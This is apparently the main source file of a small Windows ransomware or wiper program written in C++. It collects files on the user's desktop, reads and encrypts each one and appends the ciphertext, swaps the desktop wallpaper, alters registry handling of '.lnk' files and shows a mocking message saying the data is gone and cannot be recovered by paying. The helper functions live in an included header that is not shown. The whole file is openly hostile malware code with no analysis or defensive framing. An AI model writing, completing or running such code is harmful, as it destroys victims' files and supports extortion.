#include <windows.h>
#include <iostream>
#include <vector>
#include <string>
#include <shlobj.h>
#include <shobjidl.h>

#include<../ATH/functions.h>

int main() {
    std::vector<std::string> paths;
    PWSTR desktop_path = GetDesktopPath();
    std::wstring wpath(desktop_path);
    CoTaskMemFree(desktop_path);
    std::string root_directory(wpath.begin(), wpath.end());

    GetBackGroundImage();

    ListFiles(root_directory, paths);

    std::wstring wallpaper_path = std::wstring(root_directory.begin(), root_directory.end()) + L"\\OIP.jpg";
    ChangeBackground(wallpaper_path.c_str());

    for (const std::string& path : paths) {
        DWORD file_size = 0;
        char* context = GetFileContext(path.c_str(), file_size);
        if (context) {
            DWORD encrypted_len = 0;
            BYTE* encrypted_data = EncryptData(context, encrypted_len);
            if (encrypted_data) {
                AppendFileData(path.c_str(), encrypted_data, encrypted_len);
                delete[] encrypted_data;
            }
            HeapFree(GetProcessHeap(), 0, context);
        }
    }
    UpdateRegExts(".lnk");
    MessageBoxA(NULL, "YOU GOT RANSOMEWARED \n most files wont work \n have fun :3", "you wont pay to recover the data. because its gone", MB_OK);

    return 0;
}